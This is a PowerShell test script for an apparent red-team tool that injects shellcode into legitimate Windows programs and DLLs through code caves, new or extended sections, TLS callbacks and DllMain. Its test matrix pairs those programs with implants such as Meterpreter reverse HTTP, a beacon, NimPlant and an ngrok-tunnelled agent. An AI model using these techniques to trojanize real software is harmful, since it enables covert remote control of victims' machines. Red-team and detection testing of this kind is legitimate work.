<#
.SYNOPSIS
    Automated backdoor injection test suite for washmachine-cli.

.DESCRIPTION
    Tests all injection methods (code-cave, new-section, section-ext) and all carrier
    invoke modes (entry-point, function-backdoor, tls, dll-main) across multiple target
    executables and shellcodes, including large (100KB–800KB) shellcodes.

    Validates that:
    1. Injection completes without error (JSON success=true)
    2. Output PE has a valid MZ header
    3. ShellcodeAddress (carrier RVA) is non-zero
    4. Output file size is reasonable (>= 50% of original)

.PARAMETER CliPath
    Path to washmachine-cli.exe. Default: auto-detected from build output.

.EXAMPLE
    .\run_backdoor_tests.ps1
#>
param(
    [string]$CliPath
)

$ErrorActionPreference = "Stop"
$repoRoot = Split-Path -Parent $PSScriptRoot
$outputDir = Join-Path $repoRoot "Output\Debug\backdoor-tests"

# Auto-detect CLI
if (-not $CliPath) {
    $CliPath = Join-Path $repoRoot "Output\Debug\washmachine-cli.exe"
}
if (-not (Test-Path $CliPath)) {
    Write-Host "ERROR: CLI not found at $CliPath — build first with 'dotnet build'" -ForegroundColor Red
    exit 1
}

# Create output directory
if (-not (Test-Path $outputDir)) {
    New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
}

# Test assets
$injectablesDir = Join-Path $repoRoot "Testing\binary\injectables"
$shellcodesDir  = Join-Path $repoRoot "Testing\binary\shellcodes"

# ─────────────────────────────────────────────────────────────────────────────
#  Test matrix
#
#  Fields:
#    Target   – filename in injectables/
#    Shellcode – filename in shellcodes/
#    Method   – code-cave | new-section | section-ext | text-pad | tls-callback
#    Carrier  – entry-point | function-backdoor | tls | dll-main  (default: entry-point)
#    Enc      – none | xor
#    Ext      – output extension, default "exe"
#    Name     – unique test label
# ─────────────────────────────────────────────────────────────────────────────
$tests = @(

    # ── Standard entry-point carrier, small shellcodes ──────────────────────
    @{ Target="WinDirStat.exe";   Shellcode="calc64.bin";     Method="code-cave";   Carrier="entry-point"; Enc="none"; Name="WDS-calc-cave" }
    @{ Target="WinDirStat.exe";   Shellcode="calc64.bin";     Method="new-section"; Carrier="entry-point"; Enc="none"; Name="WDS-calc-newsec" }
    @{ Target="WinDirStat.exe";   Shellcode="calc64.bin";     Method="section-ext"; Carrier="entry-point"; Enc="none"; Name="WDS-calc-secext" }
    @{ Target="WinDirStat.exe";   Shellcode="messagebox.bin"; Method="code-cave";   Carrier="entry-point"; Enc="none"; Name="WDS-msgbox-cave" }
    @{ Target="WinDirStat.exe";   Shellcode="messagebox.bin"; Method="new-section"; Carrier="entry-point"; Enc="none"; Name="WDS-msgbox-newsec" }
    @{ Target="WinDirStat.exe";   Shellcode="notepad64.bin";  Method="code-cave";   Carrier="entry-point"; Enc="none"; Name="WDS-notepad-cave" }
    # XOR encryption is NOT supported by the backdoor command (prepare externally, inject without enc)
    @{ Target="7z.exe";           Shellcode="calc64.bin";     Method="code-cave";   Carrier="entry-point"; Enc="none"; Name="7z-calc-cave" }
    @{ Target="7z.exe";           Shellcode="calc64.bin";     Method="new-section"; Carrier="entry-point"; Enc="none"; Name="7z-calc-newsec" }
    @{ Target="7z.exe";           Shellcode="calc64.bin";     Method="section-ext"; Carrier="entry-point"; Enc="none"; Name="7z-calc-secext" }
    @{ Target="procexp64.exe";    Shellcode="notepad64.bin";  Method="code-cave";   Carrier="entry-point"; Enc="none"; Name="procexp-notepad-cave" }
    @{ Target="procexp64.exe";    Shellcode="notepad64.bin";  Method="new-section"; Carrier="entry-point"; Enc="none"; Name="procexp-notepad-newsec" }
    @{ Target="wifiinfoview.exe"; Shellcode="messagebox.bin"; Method="new-section"; Carrier="entry-point"; Enc="none"; Name="wifi-msgbox-newsec" }
    # x86 targets
    @{ Target="Cacheset.exe";     Shellcode="messagebox.bin"; Method="code-cave";   Carrier="entry-point"; Enc="none"; Name="cacheset-msgbox-cave-x86" }
    @{ Target="Cacheset.exe";     Shellcode="messagebox.bin"; Method="new-section"; Carrier="entry-point"; Enc="none"; Name="cacheset-msgbox-newsec-x86" }
    @{ Target="Cacheset.exe";     Shellcode="messagebox.bin"; Method="section-ext"; Carrier="entry-point"; Enc="none"; Name="cacheset-msgbox-secext-x86" }
    # XOR enc is unsupported by backdoor (prepare shellcode externally, inject with enc=none)

    # ── function-backdoor carrier (x64 EXE only, no encryption) ────────────
    @{ Target="WinDirStat.exe";   Shellcode="calc64.bin";     Method="code-cave";   Carrier="function-backdoor"; Enc="none"; Name="WDS-calc-cave-funcbd" }
    @{ Target="WinDirStat.exe";   Shellcode="calc64.bin";     Method="new-section"; Carrier="function-backdoor"; Enc="none"; Name="WDS-calc-newsec-funcbd" }
    @{ Target="WinDirStat.exe";   Shellcode="calc64.bin";     Method="section-ext"; Carrier="function-backdoor"; Enc="none"; Name="WDS-calc-secext-funcbd" }
    @{ Target="WinDirStat.exe";   Shellcode="messagebox.bin"; Method="code-cave";   Carrier="function-backdoor"; Enc="none"; Name="WDS-msgbox-cave-funcbd" }
    @{ Target="7z.exe";           Shellcode="calc64.bin";     Method="code-cave";   Carrier="function-backdoor"; Enc="none"; Name="7z-calc-cave-funcbd" }
    @{ Target="7z.exe";           Shellcode="calc64.bin";     Method="new-section"; Carrier="function-backdoor"; Enc="none"; Name="7z-calc-newsec-funcbd" }
    @{ Target="procexp64.exe";    Shellcode="notepad64.bin";  Method="code-cave";   Carrier="function-backdoor"; Enc="none"; Name="procexp-notepad-cave-funcbd" }
    @{ Target="wifiinfoview.exe"; Shellcode="messagebox.bin"; Method="new-section"; Carrier="function-backdoor"; Enc="none"; Name="wifi-msgbox-newsec-funcbd" }

    # ── TLS callback carrier (x64 EXE only; --method is informational for this carrier) ─
    @{ Target="WinDirStat.exe";   Shellcode="calc64.bin";     Method="new-section"; Carrier="tls"; Enc="none"; Name="WDS-calc-newsec-tls" }
    @{ Target="WinDirStat.exe";   Shellcode="messagebox.bin"; Method="new-section"; Carrier="tls"; Enc="none"; Name="WDS-msgbox-newsec-tls" }
    @{ Target="7z.exe";           Shellcode="calc64.bin";     Method="new-section"; Carrier="tls"; Enc="none"; Name="7z-calc-newsec-tls" }
    @{ Target="procexp64.exe";    Shellcode="notepad64.bin";  Method="new-section"; Carrier="tls"; Enc="none"; Name="procexp-notepad-newsec-tls" }
    @{ Target="wifiinfoview.exe"; Shellcode="calc64.bin";     Method="new-section"; Carrier="tls"; Enc="none"; Name="wifi-calc-newsec-tls" }

    # ── DllMain carrier (DLL targets only) ──────────────────────────────────
    @{ Target="TestDll.dll";      Shellcode="messagebox.bin"; Method="new-section"; Carrier="dll-main"; Enc="none"; Ext="dll"; Name="testdll-msgbox-newsec-dllmain" }
    @{ Target="TestDll.dll";      Shellcode="calc64.bin";     Method="new-section"; Carrier="dll-main"; Enc="none"; Ext="dll"; Name="testdll-calc-newsec-dllmain" }
    @{ Target="libbz2.dll";       Shellcode="messagebox.bin"; Method="new-section"; Carrier="dll-main"; Enc="none"; Ext="dll"; Name="libbz2-msgbox-newsec-dllmain" }
    @{ Target="libbz2.dll";       Shellcode="calc64.bin";     Method="new-section"; Carrier="dll-main"; Enc="none"; Ext="dll"; Name="libbz2-calc-newsec-dllmain" }
    @{ Target="libbz2.dll";       Shellcode="calc64.bin";     Method="section-ext"; Carrier="dll-main"; Enc="none"; Ext="dll"; Name="libbz2-calc-secext-dllmain" }

    # ── Big shellcodes — new-section (stress test for large payload placement) ─
    @{ Target="WinDirStat.exe";   Shellcode="ngrokedadaptix.bin";       Method="new-section"; Carrier="entry-point"; Enc="none"; Name="WDS-ngrok-newsec" }
    @{ Target="WinDirStat.exe";   Shellcode="met_revhttp.bin";          Method="new-section"; Carrier="entry-point"; Enc="none"; Name="WDS-mrev-newsec" }
    @{ Target="WinDirStat.exe";   Shellcode="1_art_beacon_x64.bin";     Method="new-section"; Carrier="entry-point"; Enc="none"; Name="WDS-artbeacon-newsec" }
    @{ Target="WinDirStat.exe";   Shellcode="NimPlant.bin";             Method="new-section"; Carrier="entry-point"; Enc="none"; Name="WDS-nimplant-newsec" }
    @{ Target="WinDirStat.exe";   Shellcode="packedngr.bin";            Method="new-section"; Carrier="entry-point"; Enc="none"; Name="WDS-packedngr-newsec" }
    @{ Target="procexp64.exe";    Shellcode="NimPlant.bin";             Method="new-section"; Carrier="entry-point"; Enc="none"; Name="procexp-nimplant-newsec" }
    @{ Target="7z.exe";           Shellcode="met_revhttp.bin";          Method="new-section"; Carrier="entry-point"; Enc="none"; Name="7z-mrev-newsec" }
    @{ Target="7z.exe";           Shellcode="NimPlant.bin";             Method="new-section"; Carrier="entry-point"; Enc="none"; Name="7z-nimplant-newsec" }

    # ── Big shellcodes — section-ext ────────────────────────────────────────
    @{ Target="WinDirStat.exe";   Shellcode="ngrokedadaptix.bin";       Method="section-ext"; Carrier="entry-point"; Enc="none"; Name="WDS-ngrok-secext" }
    @{ Target="WinDirStat.exe";   Shellcode="met_revhttp.bin";          Method="section-ext"; Carrier="entry-point"; Enc="none"; Name="WDS-mrev-secext" }
    @{ Target="WinDirStat.exe";   Shellcode="1_art_beacon_x64.bin";     Method="section-ext"; Carrier="entry-point"; Enc="none"; Name="WDS-artbeacon-secext" }
    @{ Target="WinDirStat.exe";   Shellcode="NimPlant.bin";             Method="section-ext"; Carrier="entry-point"; Enc="none"; Name="WDS-nimplant-secext" }
    @{ Target="procexp64.exe";    Shellcode="met_revhttp.bin";          Method="section-ext"; Carrier="entry-point"; Enc="none"; Name="procexp-mrev-secext" }
    @{ Target="7z.exe";           Shellcode="1_art_beacon_x64.bin";     Method="section-ext"; Carrier="entry-point"; Enc="none"; Name="7z-artbeacon-secext" }

    # ── Big shellcodes — function-backdoor carrier ──────────────────────────
    @{ Target="WinDirStat.exe";   Shellcode="met_revhttp.bin";          Method="new-section"; Carrier="function-backdoor"; Enc="none"; Name="WDS-mrev-newsec-funcbd" }
    @{ Target="WinDirStat.exe";   Shellcode="1_art_beacon_x64.bin";     Method="new-section"; Carrier="function-backdoor"; Enc="none"; Name="WDS-artbeacon-newsec-funcbd" }
    @{ Target="WinDirStat.exe";   Shellcode="NimPlant.bin";             Method="new-section"; Carrier="function-backdoor"; Enc="none"; Name="WDS-nimplant-newsec-funcbd" }

    # ── Big shellcodes — TLS carrier ────────────────────────────────────────
    @{ Target="WinDirStat.exe";   Shellcode="met_revhttp.bin";          Method="new-section"; Carrier="tls"; Enc="none"; Name="WDS-mrev-newsec-tls" }
    @{ Target="WinDirStat.exe";   Shellcode="NimPlant.bin";             Method="new-section"; Carrier="tls"; Enc="none"; Name="WDS-nimplant-newsec-tls" }
    @{ Target="procexp64.exe";    Shellcode="NimPlant.bin";             Method="new-section"; Carrier="tls"; Enc="none"; Name="procexp-nimplant-newsec-tls" }
)

$passed = 0
$failed = 0
$skipped = 0
$results = @()

Write-Host ""
Write-Host "═══════════════════════════════════════════════════════════════════════"
Write-Host "  Washmachine Backdoor Test Suite"
Write-Host "═══════════════════════════════════════════════════════════════════════"
Write-Host "  CLI   : $CliPath"
Write-Host "  Tests : $($tests.Count)"
Write-Host "═══════════════════════════════════════════════════════════════════════"
Write-Host ""

function Invoke-BackdoorTest($test, $injectablesDir, $shellcodesDir, $outputDir, $CliPath) {
    $ext         = if ($test.Ext) { $test.Ext } else { "exe" }
    $targetPath  = Join-Path $injectablesDir $test.Target
    $shellcodePath = Join-Path $shellcodesDir $test.Shellcode
    $outPath     = Join-Path $outputDir "$($test.Name).$ext"
    $carrier     = if ($test.Carrier) { $test.Carrier } else { "entry-point" }

    Write-Host -NoNewline "  [$($test.Name)] "

    if (-not (Test-Path $targetPath)) {
        Write-Host "SKIP (target not found: $($test.Target))" -ForegroundColor Yellow
        return "skip"
    }
    if (-not (Test-Path $shellcodePath)) {
        Write-Host "SKIP (shellcode not found: $($test.Shellcode))" -ForegroundColor Yellow
        return "skip"
    }

    $cmdArgs = @(
        "backdoor",
        "--pe",     $targetPath,
        "-s",       $shellcodePath,
        "-o",       $outPath,
        "--method", $test.Method,
        "--carrier", $carrier,
        "--json"
    )
    if ($test.Enc -eq "xor") {
        $cmdArgs += @("--enc", "xor", "--xor-key", "0xAA")
    }

    try {
        $rawOutput = & $CliPath @cmdArgs 2>&1
        $jsonLine  = ($rawOutput | Where-Object { $_ -match '^\{' } | Select-Object -Last 1)

        if (-not $jsonLine) {
            # Print CLI output for debugging
            $rawOutput | ForEach-Object { Write-Host "    | $_" -ForegroundColor DarkGray }
            throw "No JSON output received from CLI"
        }

        $result = $jsonLine | ConvertFrom-Json

        if (-not $result.Success) {
            throw "Injection failed: $($result.ErrorMessage)"
        }

        if (-not (Test-Path $outPath)) {
            throw "Output file not created at: $outPath"
        }

        # Validate MZ header
        $header = [System.IO.File]::ReadAllBytes($outPath)[0..1]
        if ($header[0] -ne 0x4D -or $header[1] -ne 0x5A) {
            throw "Output is not a valid PE (missing MZ header)"
        }

        $origSize = (Get-Item $targetPath).Length
        $outSize  = (Get-Item $outPath).Length
        if ($outSize -lt $origSize * 0.5) {
            throw "Output suspiciously small: ${outSize}B (orig ${origSize}B)"
        }

        if ($result.ShellcodeAddress -eq 0) {
            throw "ShellcodeAddress is 0 — carrier placement may have failed"
        }

        $epHex     = "0x{0:X}" -f $result.ShellcodeAddress
        $outSizeKB = [math]::Round($outSize / 1KB, 1)
        $scSizeKB  = [math]::Round((Get-Item $shellcodePath).Length / 1KB, 1)
        $stepCount = $result.Steps.Count
        Write-Host ("PASS  carrier={0,-18} method={1,-12} sc={2,8}KB  out={3,10}KB  ep={4}" -f $carrier, $test.Method, $scSizeKB, $outSizeKB, $epHex) -ForegroundColor Green

        return @{ Name=$test.Name; Status="PASS"; EP=$result.ShellcodeAddress; OutSizeKB=$outSizeKB; ScSizeKB=$scSizeKB; Carrier=$carrier; Method=$test.Method }
    }
    catch {
        Write-Host "FAIL  $_" -ForegroundColor Red
        return @{ Name=$test.Name; Status="FAIL"; Error=$_.ToString(); Carrier=$carrier; Method=$test.Method }
    }
}

foreach ($test in $tests) {
    $r = Invoke-BackdoorTest $test $injectablesDir $shellcodesDir $outputDir $CliPath
    if ($r -eq "skip") {
        $skipped++
    } elseif ($r.Status -eq "PASS") {
        $passed++
        $results += $r
    } else {
        $failed++
        $results += $r
    }
}

# Summary
Write-Host ""
Write-Host "═══════════════════════════════════════════════════════════════════════"
Write-Host ("  Results: {0} passed,  {1} failed,  {2} skipped  (of {3} total)" -f $passed, $failed, $skipped, $tests.Count)
if ($failed -eq 0) {
    Write-Host "  All executed tests passed!" -ForegroundColor Green
} else {
    Write-Host "  Some tests FAILED." -ForegroundColor Red
    Write-Host ""
    Write-Host "  Failed tests:"
    $results | Where-Object { $_.Status -eq "FAIL" } | ForEach-Object {
        Write-Host "    ✗ $($_.Name): $($_.Error)" -ForegroundColor Red
    }
}
Write-Host "═══════════════════════════════════════════════════════════════════════"

# Write results JSON
$results | ConvertTo-Json -Depth 5 | Out-File -FilePath (Join-Path $outputDir "backdoor_test_results.json") -Encoding utf8

exit $failed
